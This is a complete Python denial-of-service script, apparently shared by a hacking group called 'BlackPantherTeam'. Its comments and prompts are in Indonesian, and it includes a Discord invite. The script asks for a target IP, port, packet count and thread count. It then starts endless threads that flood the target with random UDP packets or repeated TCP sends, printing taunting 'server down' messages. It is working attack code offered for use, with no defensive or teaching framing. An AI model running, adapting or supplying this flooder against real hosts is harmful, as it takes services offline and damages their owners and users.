#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/UzzZ36fnSb
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by YourAnonCentral")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? PM me ")
ip = str(input(" DdosAttackByBlackPantherTeam | Ip:"))
port = int(input(" DdosAttackByBlackPantherTeam | Port:"))
choice = str(input(" DdosAttackBlackPantherTeam | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByBlackPantherTeam | Packets:"))
threads = int(input(" DdosAttackByBlackPantherTeam | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | BlackPantherTeam |")
		except:
			print("[!] | Server down mazzzsssehhh!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" BlackPantherTeam nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi mazehhh")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()